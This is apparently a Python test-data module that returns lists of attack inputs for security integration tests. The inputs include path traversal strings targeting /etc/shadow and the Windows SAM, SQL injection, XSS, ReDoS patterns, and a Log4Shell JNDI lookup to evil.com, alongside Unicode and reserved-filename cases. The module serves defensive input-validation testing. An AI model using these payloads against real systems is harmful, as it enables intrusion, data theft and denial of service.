"""Security attack scenario data for Phase 7 integration tests."""


def create_malicious_paths() -> list[str]:
    """Return path traversal attack patterns."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "../../../../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
        "/proc/self/environ",
        "/proc/version",
        "/proc/cmdline",
        "\\\\?\\C:\\Windows\\System32\\config\\SAM",
        "file:///etc/passwd",
        "file://C:/Windows/System32/config/SAM",
        "\\\\localhost\\c$\\Windows\\System32\\config\\SAM",
        "//./C:/Windows/System32/config/SAM",
        "\x00/etc/passwd",
        "test\x00.txt",
        "normal_file.txt\x00../../../etc/passwd",
    ]


def create_malicious_queries() -> list[str]:
    """Return malicious search query patterns."""
    return [
        ".*" * 1000,
        "(a+)+$",
        "(?:a|a)*$",
        "a{100000,}",
        "\\x00",
        "\\xFF" * 100,
        "\ufeff" * 1000,
        "\u202e" + "malicious_code" + "\u202d",
        "SELECT * FROM users WHERE password = ''",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "eval(base64_decode('bWFsaWNpb3VzX2NvZGU='))",
        "'; DROP TABLE users; --",
        "../../../proc/self/fd/0",
        "\\\\?\\pipe\\named_pipe",
        "CON",
        "PRN",
        "AUX",
        "NUL",
        "com1",
        "com2",
        "lpt1",
        "lpt2",
    ]


def create_unicode_attacks() -> list[str]:
    """Return Unicode normalization attack patterns."""
    return [
        "ﬁle.txt",
        "file\u0301.txt",
        "file\u200b.txt",
        "file\u2028.txt",
        "file\u2029.txt",
        "file\ufeff.txt",
        "file\u202e.txt",
        "file\u202d.txt",
        "\u0041\u0300",
        "\u00c0",
        "café",
        "cafe\u0301",
    ]
